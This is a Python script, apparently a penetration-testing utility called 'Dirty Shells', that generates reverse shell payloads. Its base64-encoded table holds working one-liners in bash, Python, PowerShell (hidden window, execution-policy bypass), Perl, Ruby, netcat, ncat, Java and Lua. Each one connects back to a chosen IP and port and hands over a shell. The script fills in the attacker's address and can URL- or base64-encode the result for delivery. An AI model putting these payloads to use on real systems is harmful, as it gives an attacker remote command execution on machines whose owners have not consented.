import argparse
import base64
import sys
from urllib.parse import quote

# Terminal color codes
COLORS = {
    "RED": "\33[91m",
    "BLUE": "\33[94m",
    "GREEN": "\033[32m",
    "YELLOW": "\033[93m",
    "PURPLE": '\033[0;35m',
    "CYAN": "\033[36m",
    "WHITE": '\33[37m',
    "END": "\033[0m"
}

BANNER = f"""
{COLORS['YELLOW']}
8888888b.  d8b         888                   .d8888b.  888               888 888          
888  "Y88b Y8P         888                  d88P  Y88b 888               888 888          
888    888             888                  Y88b.      888               888 888          
888    888 888 888d888 888888 888  888       "Y888b.   88888b.   .d88b.  888 888 .d8888b  
888    888 888 888P"   888    888  888          "Y88b. 888 "88b d8P  Y8b 888 888 88K      
888    888 888 888     888    888  888            "888 888  888 88888888 888 888 "Y8888b. 
888  .d88P 888 888     Y88b.  Y88b 888      Y88b  d88P 888  888 Y8b.     888 888      X88 
8888888P"  888 888      "Y888  "Y88888       "Y8888P"  888  888  "Y8888  888 888  88888P' 
                                   888                                                    
                              Y8b d88P                                                    
                               "Y88P"  
{COLORS['END']}
"""
print(BANNER)

# Argument Parser Setup
parser = argparse.ArgumentParser(description="Reverse Shell Generator")
parser.add_argument("-i", "--ip", type=str, help="Target IP address", dest="ipaddr")
parser.add_argument("-p", "--port", type=int, help="Target port number", dest="portnum")
parser.add_argument("-t", "--type", type=str, help="Shell type to generate", dest="type")
parser.add_argument("-l", "--list", action="store_true", help="List all available shell types", dest="list")
parser.add_argument("-a", "--all", action="store_true", help="Generate all shell types", dest="all")
parser.add_argument("-e", "--encode", choices=['base64', 'url'], help="Encode payload (base64 or url)", dest="encode", default=None)

args = parser.parse_args(args=None if sys.argv[1:] else ['--help'])

# Shell Payloads
shells = {

    "bash" : ['YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE=', 'MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97MH0vezF9OyBzaCA8JjE5NiA+JjE5NiAyPiYxOTY='],
    "python" : ['cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiezB9Iix7MX0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc=', 'Tk9URTogUHl0aG9uMwpweXRob24zIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiezB9Iix7MX0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc='],
    "powershell" : ['cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUNvbW1hbmQgTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCJ7MH0iLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7ezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiAgPSAkc2VuZGJhY2sgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiOyRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKX19OyRjbGllbnQuQ2xvc2UoKQ==','cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCd7MH0nLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7ezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfX07JGNsaWVudC5DbG9zZSgpIg=='],
    "perl" : ['cGVybCAtZSAndXNlIFNvY2tldDskaT0iezB9IjskcD17MX07c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe3tvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9fTsn','cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCJ7MH06ezF9Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3N5c3RlbSRfIHdoaWxlPD47Jw==','Tk9URTogV2luZG93cyBvbmx5CnBlcmwgLU1JTyAtZSAnJGM9bmV3IElPOjpTb2NrZXQ6OklORVQoUGVlckFkZHIsInswfTp7MX0iKTtTVERJTi0+ZmRvcGVuKCRjLHIpOyR+LT5mZG9wZW4oJGMsdyk7c3lzdGVtJF8gd2hpbGU8'],
    "ruby" : ['cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCJ7MH0iLHsxfSkudG9faTtleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgPCYlZCA+JiVkIDI+JiVkIixmLGYsZikn','cnVieSAtcnNvY2tldCAtZSAnZXhpdCBpZiBmb3JrO2M9VENQU29ja2V0Lm5ldygiezB9IiwiezF9Iik7d2hpbGUoY21kPWMuZ2V0cyk7SU8ucG9wZW4oY21kLCJyIil7e3xpb3xjLnByaW50IGlvLnJlYWR9fWVuZCc=','Tk9URTogV2luZG93cyBvbmx5CnJ1YnkgLXJzb2NrZXQgLWUgJ2M9VENQU29ja2V0Lm5ldygiezB9IiwiezF9Iik7d2hpbGUoY21kPWMuZ2V0cyk7SU8ucG9wZW4oY21kLCJyIil7e3xpb3xjLnByaW50IGlvLnJlYWR9fWVu'],
    "netcat" : ['bmMgLWUgL2Jpbi9zaCB7MH0gezF9', 'bmMgLWUgL2Jpbi9iYXNoIHswfSB7MX0=', 'bmMgLWMgYmFzaCB7MH0gezF9', 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgezB9IHsxfSA+L3RtcAo='],
    "ncat" : ['bmNhdCB7MH0gezF9IC1lIC9iaW4vYmFzaA==', 'bmNhdCAtLXVkcCB7MH0gezF9IC1lIC9iaW4vYmFzaAo=','YnVzeWJveCBuYyB7MH0gezF9IC1lIGJhc2gK'],
    "java" : ['ciA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpO3AgPSByLmV4ZWMoWyIvYmluL3NoIiwiLWMiLCJleGVjIDU8Pi9kZXYvdGNwL3swfS97MX07Y2F0IDwmNSB8IHdoaWxlIHJlYWQgbGluZTsgZG8gXCRsaW5lIDI+JjUgPiY1OyBkb25lIl0gYXMgU3RyaW5nW10pO3Aud2FpdEZvcigp'],
    "lua" : ['Tk9URTogTGludXggb25seQpsdWEgLWUgInJlcXVpcmUoJ3NvY2tldCcpO3JlcXVpcmUoJ29zJyk7dD1zb2NrZXQudGNwKCk7dDpjb25uZWN0KCd7MH0nLCd7MX0nKTtvcy5leGVjdXRlKCcvYmluL3NoIC1pIDwmMyA+JjMgMj4mMycpOyI=','bHVhNS4xIC1lICdsb2NhbCBob3N0LCBwb3J0ID0gInswfSIsIHsxfSBsb2NhbCBzb2NrZXQgPSByZXF1aXJlKCJzb2NrZXQiKSBsb2NhbCB0Y3AgPSBzb2NrZXQudGNwKCkgbG9jYWwgaW8gPSByZXF1aXJlKCJpbyIpIHRjcDpjb25uZWN0KGhvc3QsIHBvcnQpOyB3aGlsZSB0cnVlIGRvIGxvY2FsIGNtZCwgc3RhdHVzLCBwYXJ0aWFsID0gdGNwOnJlY2VpdmUoKSBsb2NhbCBmID0gaW8ucG9wZW4oY21kLCAiciIpIGxvY2FsIHMgPSBmOnJlYWQoIiphIikgZjpjbG9zZSgpIHRjcDpzZW5kKHMpIGlmIHN0YXR1cyA9PSAiY2xvc2VkIiB0aGVuIGJyZWFrIGVuZCBlbmQgdGNwOmNsb3NlKCkn'],
    
}
def encode_payload(payload, encoding, ip=None, port=None):
    """Decode and encode the payload with placeholders replaced."""
    try:
        decoded = base64.b64decode(payload).decode('utf-8')
        if ip and port:
            decoded = decoded.format(ip, port)
        if encoding == 'url':
            return quote(decoded)
        elif encoding == 'base64':
            return base64.b64encode(decoded.encode('utf-8')).decode('utf-8')
        return decoded
    except Exception as e:
        return f"Error encoding payload: {e}"

def generate_shell(shell_type, encode=None, ip=None, port=None):
    """Generate a specific shell payload."""
    if shell_type not in shells:
        print(f"{COLORS['RED']}Error: Shell type '{shell_type}' not found.{COLORS['END']}")
        return
    print(f"\n{COLORS['CYAN']}===> {shell_type.title()} Reverse Shell <==={COLORS['END']}")
    for payload in shells[shell_type]:
        final_payload = encode_payload(payload, encode, ip, port)
        print(final_payload)

def list_shells():
    """List all available shell types."""
    print(f"\n{COLORS['GREEN']}===> Available Shells <==={COLORS['END']}")
    for shell in shells.keys():
        print(f"- {shell.title()}")

# Main Execution
if args.list:
    list_shells()

elif args.all:
    for shell_type in shells.keys():
        generate_shell(shell_type, args.encode, args.ipaddr, args.portnum)

elif args.type:
    if not args.ipaddr or not args.portnum:
        print(f"{COLORS['RED']}Error: IP and Port are required for generating a shell.{COLORS['END']}")
    else:
        generate_shell(args.type, args.encode, args.ipaddr, args.portnum)

else:
    print(f"{COLORS['RED']}Error: No valid arguments provided. Use -h for help.{COLORS['END']}")
